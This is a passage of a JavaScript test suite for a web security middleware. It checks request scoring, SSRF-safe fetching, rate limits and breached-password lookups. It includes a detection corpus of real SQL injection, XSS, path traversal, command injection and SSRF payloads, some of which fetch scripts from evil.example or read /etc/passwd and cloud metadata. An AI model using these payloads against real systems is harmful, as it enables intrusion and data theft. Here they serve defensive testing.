  const mw = bitoraExpress(guard)
  for (let i = 0; i < 12; i++) {
    const handlers = {}
    const req = { method: 'POST', originalUrl: '/api/login', url: '/api/login', headers: { 'x-forwarded-for': '6.6.6.6, 5.5.5.' + i }, socket: { remoteAddress: '10.0.0.2' }, body: { email: 'victim@x.com', password: 'p' } }
    const res = { statusCode: 401, on: (e, f) => (handlers[e] = f), setHeader() {}, end() {} }
    await new Promise((resolve) => mw(req, res, resolve))
    handlers.finish()
  }
  await guard.flush()
  assert.ok(sent.some((e) => e.kind === 'brute_force'), JSON.stringify(sent))
})

test('the Hono adapter reads c.res after the handler and the Next route wrapper sees the status and the id', async () => {
  const { guard, sent } = watched()
  const mw = bitoraHono(guard)
  for (let i = 0; i < 12; i++) {
    const raw = web('/api/login', { ip: '7.7.7.' + i, method: 'POST', headers: { 'content-type': 'application/json' } })
    const c = { req: { raw, url: raw.url, method: 'POST', header: () => '' }, res: { status: 401 }, json: () => null }
    await mw(c, async () => {})
  }
  const wrapped = guard.route(async () => new Response('{}', { status: 404 }), { idParam: 'id' })
  for (let i = 0; i < 40; i++) await wrapped(web('/api/doc/' + i, { ip: '8.8.4.4' }), { params: Promise.resolve({ id: String(i) }) })
  await guard.flush()
  assert.ok(sent.some((e) => e.kind === 'scan_probe'), JSON.stringify(sent.map((e) => e.kind)))
  assert.ok(sent.some((e) => e.kind === 'id_sweep' || e.kind === 'scan_probe'))
})

test('auth.failed and event never throw, and an event sends only a name', async () => {
  const { guard, sent } = watched()
  assert.doesNotThrow(() => guard.auth.failed())
  assert.doesNotThrow(() => guard.event(null))
  guard.event('Price Tampered!!', { ip: '8.8.4.4', note: 'secret-value-9' })
  await guard.flush()
  const e = sent.find((x) => x.kind === 'app_event')
  assert.equal(e.param, 'pricetampered')
  assert.ok(!JSON.stringify(sent).includes('secret-value-9'))
})

// ---- the Shield (guard 2.0, F2) ----
import { createShield, RULES } from './pkg/shield.js'

const scoreOf = (shield, { query = '', body, path = '/api/x', agent = 'Mozilla/5.0' } = {}) => shield.scan({ path, search: query, body, agent })

// Payloads taken from the usual sqlmap / XSS / traversal / NoSQL lists. Each must reach the threshold at level 1.
const ATTACKS = {
  sqli: [
    "?id=1' OR '1'='1", "?id=1 OR 1=1", "?q=1 UNION SELECT username,password FROM users", "?q=1/**/UNION/**/SELECT/**/1,2,3",
    "?q=1;DROP TABLE users", "?q=1' AND SLEEP(5)", "?q=1; WAITFOR DELAY '0:0:5'", "?q=' UNION ALL SELECT table_name FROM information_schema.tables--",
    '?q=%27%20OR%20%271%27%3D%271', '?q=1%27%20union%20select%201%2C2--', "?q=1) OR (1=1", "?q=x' or 'a'='a",
    // the shapes of sqlmap with a browser User-Agent that the first rules let through (deploy/lab-attack)
    '?id=(CASE WHEN 5413=5413 THEN 5413 ELSE NULL END)', '?id=1) AND (SELECT (CASE WHEN (5413=5413) THEN NULL ELSE CTXSYS.DRITHSX.SN(5413,5413) END) FROM DUAL) IS NULL',
    '?id=1 RLIKE (SELECT (CASE WHEN (5413=5413) THEN 1 ELSE 0x28 END))', '?id=1)) AND 5413=4961 AND ((6735=6735', '?id=1)) ORDER BY 7-- okuB',
    "?id=1;DECLARE @cbNn NVARCHAR(4000);SET @cbNn=(SELECT 'q');RAISERROR(@cbNn,16,1)--", '?id=1 AND 2174=(SELECT 2174 FROM (SELECT(SLEEP(5)))x)',
    '?id=1%29%29%20AND%205413%3D4961%20AND%20%28%286735%3D6735',
  ],
  xss: [
    '?q=<script>alert(1)</script>', '?q=%3Cscript%3Ealert(1)%3C/script%3E', '?q=<img src=x onerror=alert(1)>', '?q=<svg/onload=alert(1)>',
    '?q=<a href="javascript:alert(1)">x</a>', '?u=javascript:alert(document.cookie)', '?q="><script src=//evil.example/x.js></script>', '?q=<body onload=alert(1)>',
  ],
  lfi: ['?f=../../../../etc/passwd', '?f=..%2f..%2f..%2fetc%2fpasswd', '?f=....//....//etc/passwd', '?f=/etc/passwd', '?f=php://filter/convert.base64-encode/resource=index.php', '?f=%2e%2e%2f%2e%2e%2fwindows/win.ini', '?f=file:///etc/hosts'],
  rce: ['?c=;cat /etc/passwd', '?c=|whoami', '?c=$(id)', '?c=`uname -a`', '?c=x %26%26 curl http://evil.example/s.sh | sh', '?h=${jndi:ldap://evil.example/a}'],
  ssrf: ['?url=http://169.254.169.254/latest/meta-data/', '?url=http://metadata.google.internal/computeMetadata/v1/'],
}

test('the Shield reaches the threshold on every attack of the corpus', () => {
  const shield = createShield()
  const missed = []
  for (const [family, list] of Object.entries(ATTACKS)) for (const q of list) if (scoreOf(shield, { query: q }).score < 5) missed.push(family + ' ' + q)
  assert.deepEqual(missed, [])
})

test('NoSQL operators, prototype pollution and SSRF in a JSON body or form field', () => {
  const shield = createShield()
  assert.ok(scoreOf(shield, { body: { user: 'a', password: { $ne: null } } }).score >= 5)
  assert.ok(scoreOf(shield, { body: { filter: { $where: 'sleep(100)' } } }).score >= 5)
  assert.ok(scoreOf(shield, { body: JSON.parse('{"a":{"__proto__":{"admin":true}}}') }).score >= 5)
  assert.ok(scoreOf(shield, { body: { constructor: { prototype: { x: 1 } } } }).score >= 5)
  assert.ok(scoreOf(shield, { query: '?user[$ne]=x' }).score >= 5)
  assert.ok(scoreOf(shield, { query: '?__proto__[admin]=1' }).score >= 5)
  assert.ok(scoreOf(shield, { body: { webhook: 'http://169.254.169.254/latest' } }).score >= 5)
  assert.ok(scoreOf(shield, { body: { items: [{ q: "1' union select 1,2--" }] } }).score >= 5, 'nested values are read')
  assert.ok(scoreOf(shield, { agent: 'sqlmap/1.7' }).score >= 5, 'a scanner that names itself')
  assert.ok(scoreOf(shield, { agent: '${jndi:ldap://x/a}' }).score >= 0)
})

// Ordinary traffic that carries the same characters. At level 1 nothing may reach the threshold.
const LEGIT = [
  "?name=O'Brien", "?name=D'Angelo&city=L'Hospitalet", '?q=rock \'n\' roll', "?q=it's 5 o'clock", '?q="quoted phrase" other', '?comment=great -- thanks',
  '?pw=p%40ss\'word--#1', '?pw=\'--', '?pw=a" or b', '?email=ana+test@example.com', '?redirect=https://example.com/a?b=c&d=e', '?next=/dashboard',
  '?q=select the best one from the list', '?q=union of two sets', '?q=drop the beat', '?q=I want to delete my account', '?q=update my address', '?q=insert coin',
  '?q=1 or 2 people', '?q=this and that', '?q=and=or', '?sort=name&order=desc&page=2', '?q=C%2B%2B+tutorial', '?q=a%26b', '?path=/docs/guide/intro',
  '?q=<3 you', '?q=5 < 6 and 7 > 3', '?msg=use <b>bold</b> for emphasis', '?q=email@example.com;other@example.com', '?q=cat food', '?q=id card', '?q=ls',
  '?q=sleep better', '?q=1;2;3', '?q=case when it rains then stay home', '?q=order by 2 days', '?q=pick (select one) of three', '?q=sizes 40 and 42 are medium', '?q=take 2 and 3 = 5', '?q=declare your income', '?q=a and (b or c)', '?q=shutdown schedule 10-12', '?price=10%7C20', '?url=https://example.com', '?img=https://cdn.example.com/a.png', '?lang=es-ES', '?t=2026-10-29T10:00:00Z',
  '?q=http://localhost-news.example.com', '?q=../docs', '?file=report..final.pdf', '?q=etc passwd policy', '?q=$100 off', '?q=${name} is a placeholder in my template',
]

test('ordinary traffic with quotes, dashes, SQL words and angle brackets is not flagged at level 1', () => {
  const shield = createShield()
  const flagged = LEGIT.map((q) => [q, scoreOf(shield, { query: q })]).filter(([, r]) => r.score >= 5)
  assert.deepEqual(flagged.map(([q, r]) => q + ' ' + JSON.stringify(r.matched)), [])
  const body = {
    name: "Sinéad O'Connor", bio: 'I like SQL: SELECT is fun, and so is DROP-in replacement. Use -- for comments.', markdown: '# Title\n\n```js\nconst a = 1 || 2; if (a && b) {}\n```\n- item\n- **bold** <br>',
    price: { amount: 10, currency: 'EUR' }, tags: ['a', 'b'], search: '"exact" OR "other"', link: 'https://example.com/path?x=1&y=2', password: "Tr0ub4dor&3'--;",
  }
  assert.ok(scoreOf(createShield(), { body }).score < 5, JSON.stringify(scoreOf(createShield(), { body }).matched))
})

test('level 2 catches more and is allowed to be wrong more often; level 1 stays quiet on the same text', () => {
  const l1 = createShield({ paranoia: 1 })
  const l2 = createShield({ paranoia: 2 })
  const q = '?q=select name, email from users where id = 4'
  assert.equal(scoreOf(l1, { query: q }).score, 0)
  assert.ok(scoreOf(l2, { query: q }).score >= 3)
  assert.ok(l2.level === 2 && RULES.some((r) => r.pl === 2))
})

test('exclusions silence a rule on one parameter or route and nothing else', () => {
  const shield = createShield({ exclusions: [{ match: '/api/posts', params: ['body.markdown'], rules: ['xss'] }] })
  const html = '<script>alert(1)</script>'
  assert.equal(scoreOf(shield, { path: '/api/posts', body: { markdown: html } }).score, 0, 'excluded parameter')
  assert.ok(scoreOf(shield, { path: '/api/posts', body: { title: html } }).score >= 5, 'another parameter of the same route')
  assert.ok(scoreOf(shield, { path: '/api/comments', body: { markdown: html } }).score >= 5, 'another route')
  assert.ok(scoreOf(shield, { path: '/api/posts', body: { markdown: "1' union select 1,2--" } }).score >= 5, 'another rule on the same parameter')
})

test('what is reported names the rule and the parameter, never the value', async () => {
  const { guard, sent } = watched({ mode: 'enforce' })
  const secret = 'S3CR3T-payload-77'
  const d = await guard.check(web('/api/search?q=' + encodeURIComponent("' union select '" + secret + "',2--"), { ip: '8.8.4.4' }))
  assert.equal(d.status, 403)
  await guard.flush()
  const e = sent.find((x) => x.kind === 'shield')
  assert.ok(e && e.param === 'query.q' && e.rules.includes('sqli.union') && e.action === 'blocked' && e.score === 5, JSON.stringify(sent))
  assert.ok(!JSON.stringify(sent).includes(secret))
})

test('observe mode only says what the Shield would have done', async () => {
  const { guard, sent } = watched()
  assert.equal((await guard.check(web('/s?q=<script>alert(1)</script>', { ip: '8.8.4.4' }))).wouldHave, 'shield')
  await guard.flush()
  assert.ok(sent.some((x) => x.kind === 'shield' && x.would_have === true))
})

test('the Shield reads an Express body already parsed and a Hono JSON body, and a clean body passes', async () => {
  const { guard } = watched({ mode: 'enforce' })
  const mw = bitoraExpress(guard)
  const run = (body, ip) =>
    new Promise((resolve) => {
      const req = { method: 'POST', originalUrl: '/api/login', url: '/api/login', headers: {}, socket: { remoteAddress: ip }, body }
      const res = { statusCode: 200, on() {}, setHeader() {}, end() { resolve(res.statusCode) } }
      mw(req, res, () => resolve(200))
    })
  assert.equal(await run({ email: { $ne: '' }, password: { $ne: '' } }, '8.8.4.4'), 403)
  assert.equal(await run({ email: 'a@b.es', password: "it's-fine--" }, '8.8.8.8'), 200)
  const hono = bitoraHono(guard)
  const raw = (b) => web('/api/x', { ip: '8.8.1.9', method: 'POST', headers: { 'content-type': 'application/json' } })
  const mk = (b, ip) => new Request('https://shop.example.com/api/x', { method: 'POST', headers: { 'x-forwarded-for': ip, 'content-type': 'application/json', 'content-length': String(JSON.stringify(b).length) }, body: JSON.stringify(b) })
  const out = []
  for (const [b, ip] of [[{ a: JSON.parse('{"__proto__":{"x":1}}') }, '8.8.1.9'], [{ a: 'fine' }, '8.8.1.10']]) {
    const r = mk(b, ip)
    const c = { req: { raw: r, url: r.url, method: 'POST', header: () => '' }, res: { status: 200 }, json: (x, s) => ((out.push(s)), null) }
    await hono(c, async () => out.push(200))
  }
  assert.deepEqual(out, [403, 200])
})

test('guard.route checks the body before the handler of a Next route runs, and fails open on a broken body', async () => {
  const { guard } = watched({ mode: 'enforce' })
  let ran = 0
  const wrapped = guard.route(async () => (ran++, new Response('ok')))
  const post = (body, ct = 'application/json') => new Request('https://shop.example.com/api/x', { method: 'POST', headers: { 'x-forwarded-for': '8.8.4.4', 'content-type': ct }, body })
  assert.equal((await wrapped(post('{"q":{"$where":"1"}}'))).status, 403)
  assert.equal(ran, 0, 'the handler never saw it')
  assert.equal((await wrapped(post('{"q":"hola"}'))).status, 200)
  assert.equal((await wrapped(post('{not json'))).status, 200, 'a body that cannot be read is let through')
  assert.equal(ran, 2)
})

test('the Shield can be switched off, and an address nobody vouches for earns no score', async () => {
  const off = g2({ mode: 'enforce', shield: { enabled: false } })
  assert.equal((await off.check(web('/s?q=<script>x</script>', { ip: '8.8.4.4' }))).action, 'allow')
  const g = createGuard({ mode: 'enforce', remote: { enabled: false }, report: { enabled: false } })
  const a = await g.check(web('/s?q=<script>x</script>'))
  assert.equal(a.status, 403, 'the request itself is still refused')
  assert.equal((await g.check(web('/ok'))).action, 'allow', 'but nobody is blamed for it')
})

// ---- sinks and flows (guard 2.0, F4) ----
import { guardFetch, isPublicIp, BlockedUrlError } from './pkg/node.js'
import http from 'node:http'

test('isPublicIp: private, loopback, link-local, mapped and embedded addresses are not public; ordinary ones are', () => {
  const no = [
    '127.0.0.1', '10.1.2.3', '172.16.0.1', '172.31.255.255', '192.168.1.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '224.0.0.1', '255.255.255.255', '192.0.2.5', '198.18.0.1',
    '::1', '::', 'fc00::1', 'fd12:3456::1', 'fe80::1', 'ff02::1', '::ffff:127.0.0.1', '::ffff:7f00:1', '::ffff:169.254.169.254', '64:ff9b::a9fe:a9fe', '2002:a9fe:a9fe::1', '2001:db8::1', 'not-an-ip',
  ]
  const yes = ['8.8.8.8', '1.1.1.1', '172.15.0.1', '172.32.0.1', '100.63.255.255', '2606:4700:4700::1111', '2001:4860:4860::8888', '::ffff:8.8.8.8']
  assert.deepEqual(no.filter(isPublicIp), [])
  assert.deepEqual(yes.filter((x) => !isPublicIp(x)), [])
})

// A fetch whose DNS and sockets are pretend: it records which address it was told to connect to.
const sink = ({ dns = { 'ok.example.com': ['93.184.216.34'] }, responses = {} } = {}) => {
  const calls = []
  const notes = []
  const guard = { note: (k, a) => notes.push([k, a.param]) }
  const f = guardFetch(guard, {
    resolve: async (h) => (dns[h] || []).map((address) => ({ address, family: address.includes(':') ? 6 : 4 })),
    dispatch: async (u, target, init) => {
      calls.push({ url: u.href, ip: target.address, init })
      return responses[u.href] || { status: 200, headers: { 'content-type': 'text/plain' }, body: Buffer.from('hola') }
    },
  })
  return { f, calls, notes }
}
const blockedWith = async (p) => {
  try {
    await p
  } catch (e) {
    return e instanceof BlockedUrlError ? e.reason : 'other:' + e.message
  }
  return 'allowed'
}

test('guardFetch: scheme, port, credentials, literal addresses and names that resolve inside are refused', async () => {
  const { f, calls, notes } = sink({ dns: { 'ok.example.com': ['93.184.216.34'], 'evil.example.com': ['10.0.0.5'], 'mixed.example.com': ['93.184.216.34', '169.254.169.254'] } })
  assert.equal(await blockedWith(f('file:///etc/passwd')), 'scheme')
  assert.equal(await blockedWith(f('ftp://ok.example.com/x')), 'scheme')
  assert.equal(await blockedWith(f('https://ok.example.com:8443/x')), 'port')
  assert.equal(await blockedWith(f('https://user:pw@ok.example.com/')), 'credentials')
  assert.equal(await blockedWith(f('http://169.254.169.254/latest/meta-data/')), 'private_address')
  assert.equal(await blockedWith(f('http://2130706433/')), 'private_address', 'the decimal form of 127.0.0.1')
  assert.equal(await blockedWith(f('http://0x7f.1/')), 'private_address')
  assert.equal(await blockedWith(f('http://[::1]/')), 'private_address')
  assert.equal(await blockedWith(f('http://[::ffff:7f00:1]/')), 'private_address')
  assert.equal(await blockedWith(f('https://evil.example.com/')), 'private_address')
  assert.equal(await blockedWith(f('https://mixed.example.com/')), 'private_address', 'one bad answer spoils the name')
  assert.equal(await blockedWith(f('https://nowhere.example.com/')), 'dns_failed')
  assert.equal(await blockedWith(f('not a url')), 'invalid_url')
  assert.equal(calls.length, 0, 'nothing was ever sent to any of them')
  assert.ok(notes.some(([k, p]) => k === 'ssrf_blocked' && p === 'private_address'), 'the owner is told, with the reason and no address')
})

test('guardFetch connects to the address it checked, and a normal address works', async () => {
  const { f, calls } = sink()
  const res = await f('https://ok.example.com/path?q=1', { method: 'POST', body: 'x', headers: { Authorization: 'Bearer t' } })
  assert.equal(res.status, 200)
  assert.equal(await res.text(), 'hola')
  assert.equal(calls[0].ip, '93.184.216.34', 'the connection goes to the address that passed the check, not to the name again')
  assert.equal(calls[0].init.method, 'POST')
})

test('guardFetch checks every redirect, drops credentials on the way and stops redirect loops', async () => {
  const dns = { 'ok.example.com': ['93.184.216.34'], 'other.example.com': ['93.184.216.35'] }
  const responses = {
    'https://ok.example.com/a': { status: 302, headers: { location: 'http://169.254.169.254/' }, body: Buffer.alloc(0) },
    'https://ok.example.com/b': { status: 302, headers: { location: 'https://other.example.com/c' }, body: Buffer.alloc(0) },
    'https://other.example.com/c': { status: 200, headers: {}, body: Buffer.from('fin') },
    'https://ok.example.com/loop': { status: 302, headers: { location: '/loop' }, body: Buffer.alloc(0) },
  }
  const t = sink({ dns, responses })
  assert.equal(await blockedWith(t.f('https://ok.example.com/a')), 'private_address', 'a redirect to the inside is refused like the first address')
  const ok = await t.f('https://ok.example.com/b', { headers: { authorization: 'Bearer secret', 'x-ok': '1' } })
  assert.equal(await ok.text(), 'fin')
  const last = t.calls.at(-1)
  assert.equal(last.ip, '93.184.216.35')
  assert.equal(last.init.headers.authorization, undefined, 'a credential for one host is not sent to the next')
  assert.equal(last.init.headers['x-ok'], '1')
  assert.equal(await blockedWith(t.f('https://ok.example.com/loop')), 'too_many_redirects')
})

test('guardFetch: allow-list of hosts', async () => {
  const { f } = sink({ dns: { 'api.stripe.com': ['93.184.216.34'], 'x.partner.com': ['93.184.216.34'], 'evil.com': ['93.184.216.34'] } })
  const g = guardFetch({ note() {} }, { allow: ['api.stripe.com', '.partner.com'], resolve: async () => [{ address: '93.184.216.34', family: 4 }], dispatch: async () => ({ status: 200, headers: {}, body: Buffer.from('') }) })
  assert.equal((await g('https://api.stripe.com/v1')).status, 200)
  assert.equal((await g('https://x.partner.com/')).status, 200)
  assert.equal(await blockedWith(g('https://evil.com/')), 'not_allowed')
  assert.ok(f)
})

test('guardFetch against a real server: refuses it by default, and with allowPrivate it limits the size of the answer', async () => {
  const server = http.createServer((req, res) => {
    if (req.url === '/big') return res.end('x'.repeat(5000))
    res.end('hello')
  })
  await new Promise((r) => server.listen(0, '127.0.0.1', r))
  const port = server.address().port
  try {
    const refuse = guardFetch(null, { ports: [port] })
    assert.equal(await blockedWith(refuse('http://127.0.0.1:' + port + '/')), 'private_address')
    const dev = guardFetch(null, { ports: [port], allowPrivate: true, maxBytes: 1000 })
    assert.equal(await (await dev('http://127.0.0.1:' + port + '/')).text(), 'hello')
    assert.equal(await blockedWith(dev('http://127.0.0.1:' + port + '/big')), 'too_large')
  } finally {
    server.close()
  }
})

test('flows: a named budget per user, per address and for the whole site; observe mode only says what it would do', () => {
  const flows = { sms_send: { perUser: { max: 2, windowSec: 3600 }, perIp: { max: 4, windowSec: 3600 }, global: { max: 6, windowSec: 3600 } } }
  const g = g2({ mode: 'enforce', flows })
  assert.equal(g.flow('sms_send', { user: 'u1', ip: '8.8.8.1' }).action, 'allow')
  assert.equal(g.flow('sms_send', { user: 'u1', ip: '8.8.8.1' }).action, 'allow')
  const third = g.flow('sms_send', { user: 'u1', ip: '8.8.8.1' })
  assert.deepEqual([third.action, third.reasons, third.status], ['block', ['user_limit'], 429])
  assert.ok(third.retryAfter > 0)
  assert.equal(g.flow('sms_send', { user: 'u2', ip: '8.8.8.1' }).action, 'allow', 'another user')
  assert.equal(g.flow('unknown_flow', { user: 'u1' }).action, 'allow', 'a flow nobody configured is not limited')
  const watching = g2({ flows })
  for (let i = 0; i < 2; i++) watching.flow('sms_send', { user: 'u1' })
  const w = watching.flow('sms_send', { user: 'u1' })
  assert.equal(w.action, 'allow')
  assert.equal(w.wouldHave, 'flow_limited')
})

test('flows and sign-ups are reported to Bitora, by name and reason only', async () => {
  const { guard, sent } = watched({ mode: 'enforce', flows: { coupon: { perIp: { max: 1, windowSec: 60 } } } })
  guard.flow('coupon', { ip: '8.8.4.4', ipSource: 'socket' })
  guard.flow('coupon', { ip: '8.8.4.4', ipSource: 'socket' })
  guard.signup({ email: 'a@mailinator.com', ip: '8.8.8.9' })
  await guard.flush()
  assert.ok(sent.some((e) => e.kind === 'flow_limited' && e.param === 'coupon' && e.ip === '8.8.4.4'))
  const s = sent.find((e) => e.kind === 'signup_blocked')
  assert.ok(s && s.param === 'disposable_email')
  assert.ok(!JSON.stringify(sent).includes('mailinator'), 'the address typed never leaves')
})

test('isBreached: only five characters of the hash go out, the comparison is local, and a failure is not a verdict', async () => {
  const asked = []
  const fetch = async (url) => {
    asked.push(url)
    return { ok: true, text: async () => '0018A45C4D1DEF81644B54AB7F969B88D65:3\r\n1E4C9B93F3F0682250B6CF8331B7EE68FD8:9545824\r\n00D4F6E8FA6EECAD2A3AA415EEC418D38EC:0' }
  }
  const g = g2({ fetch })
  assert.deepEqual(await g.isBreached('password'), { breached: true, count: 9545824, checked: true })
  assert.equal(asked[0], 'https://api.pwnedpasswords.com/range/5BAA6', 'only the prefix of the hash')
  assert.equal(asked[0].split('/range/')[1].length, 5)
  assert.equal((await g2({ fetch: async () => ({ ok: true, text: async () => '0018A45C4D1DEF81644B54AB7F969B88D65:3' }) }).isBreached('a-long-unique-passphrase-9')).breached, false)
  assert.deepEqual(await g2({ fetch: async () => { throw new Error('down') } }).isBreached('x'), { breached: false, count: 0, checked: false })
  assert.equal((await g2({ fetch: async () => ({ ok: true, text: async () => '1E4C9B93F3F0682250B6CF8331B7EE68FD8:0' }) }).isBreached('password')).breached, false, 'a padded decoy has a count of 0')
})

test('AI spend in a stream: the charge is corrected with the usage the stream reports', async () => {
  const chunks = (list) => ({
    async *[Symbol.asyncIterator]() {
      for (const c of list) yield c
    },
    controller: 'kept',
  })
  const openai = (list) => ({ chat: { completions: { create: async () => chunks(list) } } })
  const guard = g2({ mode: 'enforce', ai: { maxOutputTokens: 1000, perUser: { tokens: 100000, windowSec: 3600 }, global: { tokens: 1000000, windowSec: 3600 } } })
  const run = async (client) => {
    const c = guard.ai.wrap(client, { user: 'u1' })
    const stream = await c.chat.completions.create({ model: 'm', stream: true, messages: [{ role: 'user', content: 'hi' }] })
    assert.equal(stream.controller, 'kept', 'the rest of the stream object is untouched')
    const seen = []
    for await (const ch of stream) seen.push(ch)
    return seen
  }
  // OpenAI: usage in the last chunk
  const seen = await run(openai([{ choices: [{}] }, { choices: [], usage: { prompt_tokens: 10, completion_tokens: 20, total_tokens: 30 } }]))
  assert.equal(seen.length, 2, 'every chunk passes through')
  // a second user whose stream reports tiny usage can keep going far beyond the estimate; the first is charged for 30 tokens, not the estimate
  const tight = g2({ mode: 'enforce', ai: { maxOutputTokens: 1000, perUser: { tokens: 1100, windowSec: 3600 }, global: { tokens: 1000000, windowSec: 3600 } } })
  const mk = (list) => tight.ai.wrap(openai(list), { user: 'u9' })
  const call = async (list) => {
    const s = await mk(list).chat.completions.create({ model: 'm', stream: true, messages: 'hi' })
    for await (const ch of s) void ch
  }
  await call([{ usage: { total_tokens: 40 } }]) // reserved ~1000, settled to 40
  await call([{ usage: { total_tokens: 40 } }]) // would be refused if the first still held ~1000
  // Anthropic: input in message_start, output in message_delta
  const anth = { messages: { create: async () => chunks([{ type: 'message_start', message: { usage: { input_tokens: 12, output_tokens: 1 } } }, { type: 'message_delta', usage: { output_tokens: 50 } }]) } }
  const a = tight.ai.wrap(anth, { user: 'u8' })
  for (let i = 0; i < 2; i++) for await (const ch of await a.messages.create({ stream: true, messages: 'hi' })) void ch // refused on the second if the first kept its reservation
  // a reader that leaves early still settles
  const early = tight.ai.wrap(openai([{ usage: { total_tokens: 5 } }, { choices: [] }, { choices: [] }]), { user: 'u7' })
  for (let i = 0; i < 2; i++) {
    for await (const ch of await early.chat.completions.create({ stream: true, messages: 'hi' })) {
      void ch
      break
    }
  }
  // and a stream that reports nothing keeps the estimate, so the second call is refused
  const silent = tight.ai.wrap(openai([{ choices: [] }]), { user: 'u6' })
  await (async () => { for await (const ch of await silent.chat.completions.create({ stream: true, messages: 'hi' })) void ch })()
  await assert.rejects(silent.chat.completions.create({ stream: true, messages: 'hi' }), /AI budget exceeded/)
})

test('the stores: a window that starts with its first hit and resets, and each adapter speaks its own protocol', async () => {
  let t = 0
  const m = memoryStore({ now: () => t })
  assert.equal((await m.hit('x', 'k', { windowSec: 10 })).count, 1)
  assert.equal((await m.hit('x', 'k', { windowSec: 10, amount: 4 })).count, 5)
  assert.equal((await m.hit('y', 'k', { windowSec: 10 })).count, 1, 'another name is another counter')
  t = 10_000
  assert.equal((await m.hit('x', 'k', { windowSec: 10 })).count, 1, 'the window resets')

  // Upstash: one pipeline with INCRBY, EXPIRE NX and TTL
  let sent
  const up = upstashStore({ url: 'https://eu1.upstash.io/', token: 'tok', fetch: async (u, i) => ((sent = { u, i }), { ok: true, json: async () => [{ result: 3 }, { result: 1 }, { result: 42 }] }) })
  assert.deepEqual(await up.hit('sms', 'u1', { windowSec: 60, amount: 2 }), { count: 3, retryAfter: 42 })
  assert.equal(sent.u, 'https://eu1.upstash.io/pipeline')
  assert.equal(sent.i.headers.authorization, 'Bearer tok')
  assert.deepEqual(JSON.parse(sent.i.body), [['INCRBY', 'bsg:sms:u1', 2], ['EXPIRE', 'bsg:sms:u1', 60, 'NX'], ['TTL', 'bsg:sms:u1']])
  await assert.rejects(upstashStore({ fetch: async () => ({ ok: true }) }).hit('a', 'b', { windowSec: 1 }), /no url/)

  // a Redis client (ioredis names): the first hit starts the window and a key that lost its expiry gets one
  const kv = new Map()
  const expired = []
  const client = { incrby: async (k, n) => kv.set(k, (kv.get(k) || 0) + n).get(k), expire: async (k, s) => expired.push([k, s]), ttl: async () => 30 }
  const rs = redisStore(client)
  assert.equal((await rs.hit('a', 'k', { windowSec: 60 })).count, 1)
  assert.deepEqual(expired, [['bsg:a:k', 60]])
  assert.equal((await rs.hit('a', 'k', { windowSec: 60 })).retryAfter, 30)
  const lost = []
  const noExpiry = redisStore({ incrby: async () => 5, expire: async (k, s) => lost.push([k, s]), ttl: async () => -1 })
  assert.equal((await noExpiry.hit('a', 'k', { windowSec: 60 })).retryAfter, 60)
  assert.deepEqual(lost, [['bsg:a:k', 60]], 'a key that lost its expiry would count forever')
  assert.throws(() => redisStore({}), /incrby/)
  // node-redis names (incrBy) work too
  assert.equal((await redisStore({ incrBy: async () => 1, expire: async () => 1, ttl: async () => 5 }).hit('a', 'k', { windowSec: 9 })).count, 1)

  // Bitora keeps the counter: a block makes the count pass the ceiling so the guard agrees
  let body
  const bt = bitoraStore({ apiUrl: 'https://b.test', secret: 'bsec_x', fetch: async (u, i) => ((body = JSON.parse(i.body)), { ok: true, json: async () => ({ action: 'block', count: 7, retry_after: 33 }) }) })
  const r = await bt.hit('ai', 'user:1', { windowSec: 3600, amount: 5, max: 6 })
  assert.deepEqual(body, { kind: 'meter', name: 'ai', key: 'user:1', amount: 5, max: 6, window_s: 3600 })
  assert.deepEqual(r, { count: 7, retryAfter: 33 })
  await assert.rejects(bitoraStore({}).hit('a', 'b', { windowSec: 1, max: 1 }), /no secret/)
})

test('limit: a counter that can live in a shared store; observe says what it would do, a store that fails lets the request through', async () => {
  const shared = new Map()
  const store = { hit: async (name, key, { windowSec, amount }) => ({ count: shared.set(name + key, (shared.get(name + key) || 0) + amount).get(name + key), retryAfter: windowSec }) }
  const enforce = guard({ mode: 'enforce', store })
  for (let i = 0; i < 3; i++) assert.equal((await enforce.limit('coupon', { key: 'u1', max: 3, windowSec: 3600 })).allowed, true)
  const over = await enforce.limit('coupon', { key: 'u1', max: 3, windowSec: 3600 })
  assert.deepEqual([over.action, over.status, over.allowed, over.retryAfter], ['block', 429, false, 3600])
  assert.equal((await enforce.limit('coupon', { key: 'u2', max: 3, windowSec: 3600 })).allowed, true, 'another user')
  // a second instance of the server that shares the store sees the same count
  const other = guard({ mode: 'enforce', store })
  assert.equal((await other.limit('coupon', { key: 'u1', max: 3, windowSec: 3600 })).allowed, false)

  const observe = guard({ store })
  for (let i = 0; i < 3; i++) await observe.limit('sms', { key: 'k', max: 3 })
  const o = await observe.limit('sms', { key: 'k', max: 3 })
  assert.deepEqual([o.action, o.wouldHave], ['allow', 'flow_limited'])

  const broken = guard({ mode: 'enforce', store: { hit: async () => { throw new Error('down') } } })
  assert.deepEqual(await broken.limit('x', { key: 'k', max: 1 }), { action: 'allow', allowed: true, count: 0, checked: false })
  assert.equal((await enforce.limit('Bad Name', { key: 'k', max: 1 })).checked, false, 'a bad name is not counted')
  // the default store is this instance
  const local = guard({ mode: 'enforce' })
  await local.limit('a', { key: 'k', max: 1 })
  assert.equal((await local.limit('a', { key: 'k', max: 1 })).allowed, false)
})

test('decide: asks Bitora for the shared decisions, sends the e-mail only for its domain to be read, and fails open', async () => {
  let body
  let answer = { action: 'block', reasons: ['no_mx'], retry_after: 5 }
  const fetch = async (u, i) => ((body = { u, ...JSON.parse(i.body) }), { ok: true, json: async () => answer })
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, fetch, remote: { enabled: false }, report: { enabled: false }, mode: 'enforce' })
  const d = await g.decide('signup', { email: 'a@nomail.example', ip: '8.8.8.8', ipSource: 'socket' })
  assert.deepEqual([d.action, d.reasons, d.retryAfter], ['block', ['no_mx'], 5])
  assert.equal(body.u, 'https://security.bitora.es/api/v1/guard/decide')
  assert.deepEqual([body.kind, body.email, body.ip, body.ip_source], ['signup', 'a@nomail.example', '8.8.8.8', 'socket'])
  const observing = createGuard({ secret: 'bsec_x', fetch, remote: { enabled: false }, report: { enabled: false } })
  const w = await observing.decide('signup', { email: 'a@nomail.example' })
  assert.deepEqual([w.action, w.wouldHave], ['allow', 'blocked'])
  answer = { action: 'allow', reasons: [] }
  assert.equal((await g.decide('login', { user: 'h1' })).action, 'allow')
  const down = createGuard({ secret: 'bsec_x', fetch: async () => { throw new Error('down') }, mode: 'enforce', remote: { enabled: false }, report: { enabled: false } })
  assert.deepEqual(await down.decide('signup', { email: 'a@b.example' }), { action: 'allow', reasons: [], checked: false })
